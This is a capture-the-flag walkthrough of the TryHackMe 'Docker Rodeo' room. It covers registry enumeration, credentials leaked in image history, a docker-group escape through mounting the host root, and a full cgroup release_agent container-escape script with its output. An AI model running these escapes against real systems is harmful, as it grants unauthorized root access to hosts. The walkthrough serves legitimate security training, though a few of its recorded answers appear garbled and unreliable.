<h1 align="center">The Docker Rodeo</h1>
<p align="center">2025, September 17<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>499</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Learn a wide variety of Docker vulnerabilities in this guided showcase.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/e91b1b0f-626f-4433-b412-9ba0058f9e33"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/dockerrodeo">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/9ebc05f0-d49a-405d-a5b7-c9facf822ece"></p>

<br>

<h2>Task 1 . Preface: Setting up Docker for this Room (Deploy #1)</h2>
<p>The prerequisites for this room are a bit more complicated then most rooms, however, I'll detail every step of the way.</p>
<h3>Getting Setup</h3>
<p>

- I strongly recommend using the TryHackMe AttackBox for this room for the most reliable experience.<br
- Deploy the Instance attached to this room and wait for the IP address to be displayed.<br>
- Take note of  the IP address for your deployed Instance: <code>MACHINE_IP</code></p>

<h3>Add your Instance IP address to /etc/hosts</h3>
<p>Once you have been given your IP address, you will need to create an entry in your <code>/etc/hosts</code>code> file with both the IP address and <code>docker-rodeo.thm</code></p>
<p>

- <code>sudo nano /etc/hosts</code><br>
- Add the entry so that it looks like the following: <code>MACHINE_IP    docker-rodeo.thm</code><br><h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/672e65f9-973d-4615-80c4-175f4be66ca9"><br><br><em>TryHackMe</em></h6><br>
- Save and close the file.</p>

<h3>Tell Docker to Trust your Instance</h3>
<p>

- You will need to either create or enter the following into <code>/etc/docker/daemon.json</code>: <h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/e8c23656-245d-494e-bb97-9f03e7e74306"><br><br><em>TryHackMe</em></h6>
- Save and close the file.</p>

<h3>Restart Docker</h3>
<p>For the changes to apply, you will need to stop then start (not just restart) the Docker service:<br>

- <code>sudo systemctl stop docker</code><br>
- <strong>Wait for approximately 30 seconds</strong<br>
- <code>sudo systemctl start docker</code></p>

<p>You are now ready to progress with the room.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Let´s go<br>
<code>No answer needed</code></p>

<br>

<img width="941" height="130" alt="image" src="https://github.com/user-attachments/assets/cf59d801-e9df-4052-9193-3702d7e36a0f" />

<br>
<h2>Task 2 . Introduction to Docker</h2>
<h3> What is Docker?</h3>


<h3>What are Docker "containers" & why are they used?</h3>


<h3> What are Docker Images?</h3>

<br>
<p><em>Answer the question below</em></p>

<p>2.1. Does Docker run on a Hypervisor? (Yay/Nay)<br>
<code>Nay</code></p>

<br>
<h2>Task 3 . Vulnerability #1: Abusing a Docker Registry</h2>
<p>This task is a divider, please proceed onto the next task.</p>

<br>
<p><em>Answer the question below</em></p>

<p>3.1.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 4 . What is a Docker Registry?</h2>
<p>Before we begin exploiting a Docker Registry, we need to first understand not only how we interact with them, but as to why they are so lucrative for us pentesters.<br>

If you're familiar with Git and services such as GitHub and Gitlab, this'll be a breeze. However, let's explain a bit further to ensure we're all on the same page.<br>

Docker Registries, at their fundamental, are used to store and provide published Docker images for use. Using repositories, creators of Docker images can switch between multiple versions of their applications and share them with other people with ease.<br>

Public registries such as DockerHub exist, however, many organisations using Docker will host their own "private" registry.<br>

Take for example the RustScan DockerHub registry. The developers have created a "tag" for every version of RustScan. As this is public, anyone can switch between the version of RustScan that they want to use with ease by downloading the image for the tag they want to use.</p>
<br>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/0eca69d7-9888-4449-bc87-bc9879570513"><br><br><em>TryHackMe</em></h6>

<br>
<p>I could simply do docker pull rustscan/rustscan:1.8.0 to use version 1.8.0 of RustScan, or I could use docker pull rustscan/rustscan:latest for the most recent update. For a Docker repository to do this, the repository must store the data about every tag - this is what we'll be exploiting.<br>

Since Docker images are essentially just instruction manuals as we discussed earlier, they can be reversed to understand what commands took place when the image was being built - this information is stored in layers...We will come onto unpacking these layers in Task 4.</p>
<br>
<p><em>Answer the question below</em></p>

<p>4.1. I've learnt about Docker registries<br>
<code>No answer needed</code></p>

<br>
<h2>Task 5 . Interacting with a Docker Registry</h2>
<p>As with any system that we are going to be penetration testing, we need to enumerate the services running to understand any potential entry points. In our case, Docker Registry runs on port 5000 by default, however, this can be easily changed, so it is worth confirming via with a nmap scan like so: sudo nmap -sV xx.xxx.xx.xx</p>



<p>Not only is Nmap capable of discovering the Docker Registry, but also the API version - this is important to note for how we will interact with it.<br>

The Docker Registry is a JSON endpoint, so we cannot just simply interact with it like we would a normal website - we will have to query it. Whilst this can be done via the terminal or browser, dedicated tools such as Postman or Insomnia are much better suited for the job. I will be using Postman in this room.<br>

To understand what routes are available to us, we need to read the Docker Registry Documentation. Please take the time to read this at your leisure.</p>
<h3>Discovering Repositories </h3>
<p>We need to send a <code>GET</code> request to <code>http://docker-rodeo.thm:5000/v2/_catalog</code> to list all the repositories registered on the registry</p>

<p>In this example, we're given a response of three repositories. For now, we are only going to focus on "cmnatic/myapp1".<br>

Before we can begin analysing a repository, we need two key pieces of information:<br>

- The repository name<br>
- Any repository tag(s) published</p>

<p>We currently have the repository name (cmnatic/myapp1) now we just need to list all tags that have been published. Every repository will have a minimum of one tag. This tag is the "latest" tag, but there can be many tags, all with different code, for example, major software versions or two tags for "production" and "development".<br>

Send a <code>GET</code> request to  <code>http://docker-rodeo.thm:5000/v2/repository/name/tags/list</code> to query all published tags. For our application, our request would look like so: <code>http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list</code>:</p>


<p>Note here we have three tags? That "notsecure" tag sure sounds interesting. We now have both pieces of information to retrieve the manifest files of the image for analysis.</p>

<h3>Grabbing the Data!</h3>
<p>With these two important pieces of information about a repository known, we can enumerate that specific repository for a manifest file. This manifest file contains various pieces of information about the application, such as size, layers and other information. I'm going to grab the manifest file for the "notsecure" tag via the following GET request: http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure<br>

Note the response - specifically the "history" key;  albeit slightly hard to read, we have a command that was executed during the image building stage stored in plaintext (echo \\\"here's a flag\\\" \\u003e /root/root.txt\"]` ). In this image, it's a string insert into /root/root.txt on the container. Although imagine if this was a password!</p>



<h3>Now it's Your Turn...</h3>
<p>Apply what we have done above, enumerate the 2nd Docker registry running on the Instance, find out what repositories are stored within it and ultimately extract some credentials for a database.</p>
<br>
<p><em>Answer the questions below</em></p>

<p>5.1. What is the port number of the 2nd Docker registry?<br>
<code>7000</code></p>

<br>

<img width="946" height="299" alt="image" src="https://github.com/user-attachments/assets/e08cca66-54ef-445f-b611-c5d4777b0161" />

<br>
<p>5.2. What is the name of the repository within this registry?<br>
<code>securesolutions/webserver</code></p>


<img width="1133" height="205" alt="image" src="https://github.com/user-attachments/assets/710d0166-c696-44b2-a9bd-f4422457a1cf" />

<br>

<img width="672" height="31" alt="image" src="https://github.com/user-attachments/assets/62bd9386-f8cf-4766-8f68-65c4a6789ea0" />

<br>

<p>5.3. What is the name of the tag that has been published?<br>
<code>production</code></p>

<br>

<img width="1125" height="92" alt="image" src="https://github.com/user-attachments/assets/ccb4fc97-98bc-453d-bff3-09e8bf9b5ca1" />


<br>

<p>5.4. What is the Username in the database configuration?<br>
<code>admin</code></p>

<br>

<img width="1126" height="288" alt="image" src="https://github.com/user-attachments/assets/07096de0-281d-4a33-87db-276635083ff4" />

<br>

<p>5.5. What is the Password in the database configuration?<br>
<code>production_admin</code></p>

<br>
<br>
<h2>Task 6 . Vulnerability #2: Reverse Engineering Docker Images</h2>



<br>
<p><em>Answer the questions below</em></p>

<p>6.1. What is the "IMAGE_ID" for the "challenge" Docker image that you just downloaded?<br>
<code>2a0a63ea5d88</code></p>

<br>

<img width="1069" height="402" alt="image" src="https://github.com/user-attachments/assets/49279176-5505-4d4a-b892-0a53cc62ce93" />

<br>
<p>6.2. Using Dive, how many "Layers" are there in this image?<br>
<code>7</code></p>

<br>

<img width="1069" height="402" alt="image" src="https://github.com/user-attachments/assets/49279176-5505-4d4a-b892-0a53cc62ce93" />

<br>
<p>6.3. What user is successfully added?<br>
<code>7</code></p>

<br>

```bash
:~/TheDockerRodeo# wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
```

<br>

```bash
:~/TheDockerRodeo# sudo apt install ./dive_0.9.2_linux_amd64.deb
```

<br>

```bash
:~/TheDockerRodeo# dive 2a0a63ea5d88
Image Source: docker://2a0a63ea5d88
Fetching image... (this can take a while for large images)
Analyzing image...
Building cache...
```

<br>

<img width="1233" height="452" alt="image" src="https://github.com/user-attachments/assets/d58387ff-3681-46ea-9001-8ca7073cebbf" />

<br>


<h2>Task 7 . Vulnerability #3: Uploading Malicious Docker Images</h2>


<br>
<p><em>Answer the questions below</em></p>

<p>7.1. Escape Successful<br>
<code>No answer needed</code></p>

```bash
:~/TheDockerRodeo# ssh danny@10.201.72.13 -p 2233
...
danny@10.201.72.13's password: 
danny@3d8fe1db6635:~$ id
uid=1000(danny) gid=1000(danny) groups=1000(danny),999(docker)
danny@3d8fe1db6635:~$ pwd
/home/danny
danny@3d8fe1db6635:~$ cd /var/run
danny@3d8fe1db6635:/var/run$ ls -la | grep sock
srw-rw---- 1 root docker    0 Aug 14 22:30 docker.sock
danny@3d8fe1db6635:/var/run$ groups
danny docker
danny@3d8fe1db6635:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# pwd
/
# groups
root daemon bin sys adm disk uucp groups: cannot find name for group ID 11
11 dialout tape sudo
# cd /root
# ls -lah
total 28K
drwx------  4 root root 4.0K Nov 10  2020 .
drwxr-xr-x 24 root root 4.0K Nov 12  2020 ..
-rw-------  1 root root  406 Nov 13  2020 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4.0K Oct 24  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4.0K Nov 12  2020 .ssh
# cat authorized_keys
cat: authorized_keys: No such file or directory
# cd .ssh
# cat authorized_keys
# pwd
/root/.ssh
# ls
authorized_keys  known_hosts
# cd authorized_keys
sh: 11: cd: can't cd to authorized_keys
# cat known_hosts
|1|/EHt5UUsnI9hqwcLMFA5TdvNtrs=|qihaDMUpcVI9fwvdha7PesRjel4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
# 
```

```bash
# python3 -c 'import pty;pty.spawn("/bin/bash")'
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@cb1207065aac:~/.ssh# 
```

<br>
<br>
<h2>Task 8 . Vulnerability #4: RCE via Exposed Docker Daemon</h2>

<br>
<p><em>Answer the question below</em></p>

<p>8.1. I've executed some Docker commands remotely on the vulnerable Instance<br>
<code>No answer needed</code></p>


<h2>Task 9 . Vulnerability #5: Escape via Exposed Docker Daemon</h2>

<br>
<p><em>Answer the question below</em></p>

<p>9.1. Escape Successful<br>
<code>No answer needed</code></p>


<h2>Task 10 . Vulnerability #6: Shared Namespaces</h2>


<br>
<p><em>Answer the question below</em></p>

<p>10.1. Attempt the exploit, you will know you are successful if you can ls /home/cmnatic<br>
<code>No answer needed</code></p>


<img width="1227" height="264" alt="image" src="https://github.com/user-attachments/assets/3ba4db80-344d-4e2e-a9ae-f1b1b6f741a5" />

<br>
<br>

<img width="1229" height="417" alt="image" src="https://github.com/user-attachments/assets/7360a20b-0e4f-432f-98df-9a935ed36ec9" />

<br>
<br>

<h2>Task 11 . Vulnerability #7: Misconfigured Privileges (Deploy #2)</h2>
<p>[ Start Machine]</p>
<h3>Understanding Capabilities</h3>
<p>At it's fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.<br>

These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:<br>

- User mode<br>
- Privileged mode<br><br>
Let's refer back to our diagram in Task 2 where we detail how containers run on the operating system to highlight the differences between these two modes:</p>
<br>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/4add34a1-a2d4-49e1-8345-f70a95f696d5"></h6>

<br>
<p>Note how containers #1 and #2 are running is "user"/"normal" mode whereas container 3 is running in "privileged" mode. Containers running in "user" mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.</p>
<h3>What does this mean for us?</h3>
<p>Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect!<br>

We can use a system package such as "libcap2-bin"'s capsh to list the capabilities our container has: capsh --print . I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.</p>
<br>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/f17fdbf8-7b36-4bae-bfce-9ee8c0af489f"></h6>

<br>
<p>Before we begin to exploit this for ourselves, you will need to deploy the new Instance attached to this Task. The vulnerabilities of the previous VM conflict with this exploit.</p>
<h3>Connecting to the container</h3>
<p align="center">Connect to your <strong>new Instance</strong> using SSH with the following details:<br>

New Instance IP: MACHINE_IP<br>
SSH Port: 2244<br>
Username: ****<br>
Password: *****</p>

<p>Allowing a few minutes for the new Instance to deploy, I'm going to demonstrate leveraging the "sys_admin" capability. We can confirm we have this capability by grepping the output of <code>capsh</code>:</p>
<br>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/39eb29e6-787e-41b2-9936-5685e2b55083"></h6>

<br>
<p>This capability permits us to do multiple of things (which is listed here), but we're going to focus on the ability given to use us via "sys_admin" to be able to mount files from the host OS into the container.<br>

The code snippet below is based upon (but a modified) version of the Proof of Concept (PoC) created by Trailofbits where they detail the inner-workings to this exploit well.</p>

<p>

- mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x<br>
- echo 1 > /tmp/cgrp/x/notify_on_release<br>
- host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`<br>
- echo "$host_path/exploit" > /tmp/cgrp/release_agent<br>
- echo '#!/bin/sh' > /exploit<br>
- echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit<br>
- chmod a+x /exploit<br>
- sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"</p>

<br>
<h3>Let's briefly summarise what happens here</h3>

<p>

- We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system since we have capabilities to manage "cgroups" as root on the host, we'll mount this to "/tmp/cgrp" on the container.<br>
- For our exploit to execute, we'll need to tell Kernel to run our code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we're telling the kernel to execute something once the "cgroup" finishes. (Paul Menage., 2004)<br>
- We find out where the containers files are stored on the host and store it as a variable<br>
- Where we then echo the location of the containers files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.<br>
- Let's turn our exploit into a shell on the host<br>
- Execute a command to echo the host flag into a file named "flag.txt" in the container, once "/exploit" is executed<br>
- Make our exploit executable!<br>
- We create a process and store that into "/tmp/cgrp/x/cgroup.procs"</p>

<h3>Loot</h3>
<br>

<h6 align="center" ><img width="800px" src="https://github.com/user-attachments/assets/772a7d07-f22f-4105-ab32-69284ec185b1"><br><em>Logging into the new Instance as "root" and executing the code snippet, resulting in container escape.</em></h6>

<br>

<h6 align="center" ><img width="800px" src="https://github.com/user-attachments/assets/71e8b3f2-8bfd-4439-865e-84c3265b63a2"><br><em>Showing that the command we executed (/exploit) has grabbed the file from the host operating system.</em></h6>

<br>
<p><em>Answer the question below</em></p>

<p>11.1. Contents of "flag.txt" from the host operating system<br>
<code>thm{**********************}</code></p>


```bash
:~# ssh root@xx.xxx.xx.xxx -p 2244
The authenticity of host '[xx.xx.xx.xxx]:2244 ([xx.xxx.xx.xxx]:2244)' can't be established.
ECDSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[xx.xxx.xx.xxx]:2244' (ECDSA) to the list of known hosts.
root@xx.xxx.xx.xxx's password: 
root@8a9427527c82:~# 
```

```bash
root@8a9427527c82:~# capsh --print | grep sys_admin
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```


```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"1(rvm)
Guessed mode: UNCERTAIN (0)
```

```bash
root@8a9427527c82:/# cat flag.txt
thm{**********************}
```

<img width="1159" height="91" alt="image" src="https://github.com/user-attachments/assets/5ec61fd1-4068-4664-abfa-1ea052c852fa" />


<br>
<br>
<h2>Task 12 . Securing your Container</h2>
<p>Let's reflect back on the vulnerabilities that we have exploited. Not only have we learnt about the technology that is containerization, but also how these containers are a mere abstraction of the host's operating system.</p>
<h3>The Principle of Least Privileges</h3>
<p>Whilst this is an over-arching theme of InfoSec as a whole, we'll pertain this to Docker...<br>

Remember Docker images? The commands in these images will execute as root unless told otherwise. Let's say you create a Docker image for your webserver, in this case, the service will run as root. If an attacker managed to exploit the web server, they would now have root permissions to the container and may be able to use the techniques we outlined in Task 10 and 11.</p>

<h3>Docker  Seccomp 101</h3>
<p>Seccomp or "Secure computing" is a security feature of the Linux kernel, allowing us to restrict the capability of a container by determining the system calls it can make. Docker uses security profiles for containers. For example, we can deny the container the ability to perform actions such as using the mount namespace  (see Task 10 for demonstration of this vulnerability) or any of the Linux system calls.</p>

<h3>Securing your Daemon</h3>
<p>In later installs of the Docker engine, running a registry relies on the use of implementing self-signed SSL certificates behind a web server, where these certificates must then be distributed and trusted on every device that will be interacting with the registry. This is quite the hassle for developers wanting to setup quick environments - which goes against the entire point of Docker.</p>

<p><em>Answer the question below</em></p>

<p>12.1. I've secured my containers<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 13 . Bonus: Determining if we´re in a container</h2>
<h3>Listing running processes:</h3>
<p>Containers, due to their isolated nature, will often have very little processes running in comparison to something such as a virtual machine.<br>
We can simply use <code>ps aux</code> to print the running processes.<br>
Note in the screenshot below that there are very few processes running?</p>
<br>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/53ec935c-7603-492e-9de2-27bb34cf9964"></h6>

<br>
<p>A virtual machine has a tonne more processes running in comparison. In the case of my virtual machine, there were 312 at the time of listing.</p>
<br>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/2e3732a8-ec79-4e4b-852d-383dacbb1dfb"></h6>

<br>
<h3>Looking for .dockerenv</h3>
<p>Containers allow environment variables to be provided from the host operating system by the use of a ".dockerenv" file. This file is located in the "/" directory, and would exist on a container - even if no environment variables were provided: <code>cd / && ls -lah</code></p>
<br>

<h6 align="center" ><img width="400px" src="https://github.com/user-attachments/assets/74689b77-810b-4be4-9bf8-db9f252a3901"></h6>

<br>
<h3>Those pesky cgroups</h3>
<p>Note how we utilised "cgroups" in Task 10. Cgroups are used by containerisation software such as LXC or Docker. Let's look for them with by navigating to "/proc/1" and then catting  the "cgroups" file...It is worth mentioning that the "cgroups" file contains paths including the word "docker":</p>

<h6 align="center" ><img width="600px" src="https://github.com/user-attachments/assets/9c6a913b-de7e-437d-8442-2d01a7238ae5"></h6>

<br>
<p><em>Answer the question below</em></p>

<p>13.1. Confirming suspicions...<br>
<code>No answer needed</code></p>

<img width="1162" height="170" alt="image" src="https://github.com/user-attachments/assets/940a086a-90b6-499d-b7c3-de1df5e74def" />

<br>
<br>

<img width="1166" height="492" alt="image" src="https://github.com/user-attachments/assets/2b7371f6-acc3-47ca-be34-7e300adfd716" />

<br>
<br>

<img width="1159" height="490" alt="image" src="https://github.com/user-attachments/assets/2771c1ca-f17e-4a76-be3d-b0c37a015f79" />

<br>
<br>

<img width="1154" height="310" alt="image" src="https://github.com/user-attachments/assets/805b9b45-c74b-4af0-8c77-b2fe472514d7" />


<br>
<br>
<h2>Task 14 . Additional Material</h2>
<h3>Conclusion</h3>

<h3>Additional Material</h3>
<p>

- The Dirtyc0w kernel exploit<br>
- Exploiting runC (CVE-2019-5736)<br>
- Trailofbits' capabilities demonstration<br>
- Cgroups101</p>

<p><em>Answer the question below</em></p>

<p>14.1. Finished!<br>
<code>No answer needed</code></p>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d06cb7b1-830e-4973-9c1e-311375e0b42e"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/14541d43-cfdb-4585-ac1f-6a7fe1df4649"></p>
                  <img width="1200px" src="https://github.com/user-attachments/assets/42c6a916-a5f2-44bc-8739-aea37cec7d3a"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
|17      |Medium 🔗 - <code><strong>The Docker Rodeo</strong></code>| 499| 106ᵗʰ| 4ᵗʰ   |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/bd4d8f03-a594-4b87-a571-9ff3c819573c"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/35c95b07-ee0e-4c50-ae7d-7ef39f680d5d"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/25f8a5b4-ab6d-440c-88c3-e47abc2bb04d"><br>
                  Global monthly:    346ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/da27bca8-e27c-433a-8c50-fd7252672e66"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a1ebca54-0026-42c1-839c-0aed15b1cd2a"><br>

<h1 align="center">Thanks for coming!</h1>
